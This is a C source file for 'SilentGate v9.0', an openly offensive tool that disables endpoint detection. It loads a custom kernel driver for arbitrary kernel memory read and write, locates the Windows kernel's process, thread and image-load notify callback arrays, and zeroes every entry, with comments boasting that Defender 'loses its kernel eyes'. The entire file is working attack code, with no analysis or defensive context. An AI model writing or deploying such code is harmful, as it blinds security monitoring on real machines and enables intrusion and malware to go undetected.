/*
 * SilentGate v9.0 - EDR Kernel Callback Eraser
 * Author: JarDani
 * Uses our custom sg_driver.sys for kernel R/W
 * Removes PsSetLoadImageNotifyRoutine callbacks
 * Removes PsSetCreateProcessNotifyRoutine callbacks
 * Defender loses its kernel eyes
 */
#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
    ULONG64 address;
    ULONG   size;
    UCHAR   data[256];
} SG_MEM_REQUEST;

static HANDLE g_hDev = INVALID_HANDLE_VALUE;

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM_REQUEST req = {0};
    req.address = addr;
    req.size    = size < 256 ? size : 256;
    DWORD bytes = 0;
    return DeviceIoControl(g_hDev, IOCTL_SG_READ_VIRTUAL,
        &req, sizeof(req), buf, size, &bytes, NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM_REQUEST req = {0};
    req.address = addr;
    req.size    = size < 256 ? size : 256;
    if (req.size > 0) memcpy(req.data, buf, req.size);
    DWORD bytes = 0;
    return DeviceIoControl(g_hDev, IOCTL_SG_WRITE_VIRTUAL,
        &req, sizeof(req), &req, sizeof(req), &bytes, NULL);
}

DWORD64 get_ntos_base() {
    DWORD n=0;
    EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n);
    EnumDeviceDrivers(d,n,&n);
    DWORD64 base=0;
    char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||
           _stricmp(name,"ntkrnlmp.exe")==0){
            base=(DWORD64)d[i];break;}
    }
    free(d);
    return base;
}

DWORD64 find_kernel_export(DWORD64 ntos_base, const char* name) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat(path, "\\ntoskrnl.exe");
    HMODULE h = LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!h) return 0;
    FARPROC f = GetProcAddress(h, name);
    if (!f) { FreeLibrary(h); return 0; }
    DWORD64 offset = (DWORD64)f - (DWORD64)h;
    FreeLibrary(h);
    return ntos_base + offset;
}

/* Scan function bytes for RIP-relative LEA/MOV to find callback array */
DWORD64 find_callback_array(DWORD64 func_addr) {
    BYTE buf[256] = {0};
    vm_read(func_addr, buf, 256);

    for (int i = 0; i < 240; i++) {
        /* LEA r8/r9/r10, [rip+offset] */
        if ((buf[i]==0x4C||buf[i]==0x48||buf[i]==0x49) && buf[i+1]==0x8D) {
            INT32 off = *(INT32*)&buf[i+3];
            DWORD64 target = func_addr + i + 7 + off;
            /* Validate: target should be in kernel range */
            if (target > 0xFFFF000000000000ULL)
                return target;
        }
    }
    return 0;
}

int remove_edr_callbacks(DWORD64 array_addr, const char* name) {
    int removed = 0;
    printf("[KILL] %s array: 0x%llX\n", name, array_addr);

    for (int i = 0; i < 64; i++) {
        DWORD64 entry = 0;
        if (!vm_read(array_addr + i*8, &entry, 8)) continue;
        if (entry == 0) continue;

        /* Callback pointer — lower 4 bits are flags */
        DWORD64 cb_ptr = entry & ~0xFULL;
        if (cb_ptr < 0xFFFF000000000000ULL) continue;

        /* Read the actual callback struct — offset 8 has function pointer */
        DWORD64 func = 0;
        vm_read(cb_ptr + 8, &func, 8);

        /* Find which driver owns this callback */
        char drv_name[MAX_PATH] = "unknown";
        DWORD needed = 0;
        EnumDeviceDrivers(NULL, 0, &needed);
        LPVOID* drv = (LPVOID*)malloc(needed);
        EnumDeviceDrivers(drv, needed, &needed);
        for (DWORD j = 0; j < needed/sizeof(LPVOID); j++) {
            DWORD64 base = (DWORD64)drv[j];
            if (func >= base && func < base + 0x100000) {
                GetDeviceDriverBaseNameA(drv[j], drv_name, MAX_PATH);
                break;
            }
        }
        free(drv);

        printf("[KILL] Entry %d: 0x%llX -> %s\n", i, func, drv_name);

        /* Zero out entry to remove callback */
        DWORD64 zero = 0;
        if (vm_write(array_addr + i*8, &zero, 8)) {
            printf("[KILL] Removed %s callback %d\n", drv_name, i);
            removed++;
        }
    }
    return removed;
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;
        ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;
        ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

int main() {
    printf("[V9] SilentGate v9.0 - EDR Kernel Callback Eraser\n");
    printf("[V9] Author: JarDani\n\n");

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("[V9] Load failed\n");getchar();return 1;}

    g_hDev=CreateFileA("\\\\.\\SilentGate",
        GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(g_hDev==INVALID_HANDLE_VALUE){
        printf("[V9] Device failed\n");
        unload_driver();getchar();return 1;}

    printf("[V9] Kernel R/W ready\n\n");

    DWORD64 ntos = get_ntos_base();
    printf("[V9] ntoskrnl: 0x%llX\n\n", ntos);

    /* Find callback arrays */
    DWORD64 fn_load    = find_kernel_export(ntos, "PsSetLoadImageNotifyRoutine");
    DWORD64 fn_process = find_kernel_export(ntos, "PsSetCreateProcessNotifyRoutineEx");
    DWORD64 fn_thread  = find_kernel_export(ntos, "PsSetCreateThreadNotifyRoutine");

    printf("[V9] PsSetLoadImageNotifyRoutine    : 0x%llX\n", fn_load);
    printf("[V9] PsSetCreateProcessNotifyRoutine: 0x%llX\n", fn_process);
    printf("[V9] PsSetCreateThreadNotifyRoutine : 0x%llX\n\n", fn_thread);

    int total = 0;

    if (fn_load) {
        DWORD64 arr = find_callback_array(fn_load);
        if (arr) total += remove_edr_callbacks(arr, "LoadImage");
        else printf("[V9] LoadImage array not found\n");
    }

    if (fn_process) {
        DWORD64 arr = find_callback_array(fn_process);
        if (arr) total += remove_edr_callbacks(arr, "CreateProcess");
        else printf("[V9] CreateProcess array not found\n");
    }

    if (fn_thread) {
        DWORD64 arr = find_callback_array(fn_thread);
        if (arr) total += remove_edr_callbacks(arr, "CreateThread");
        else printf("[V9] CreateThread array not found\n");
    }

    printf("\n[V9] Total callbacks removed: %d\n", total);
    if (total > 0)
        printf("[V9] Defender kernel callbacks ERASED\n");

    CloseHandle(g_hDev);
    unload_driver();
    printf("\n[V9] Complete - press Enter\n");
    getchar();
    return 0;
}
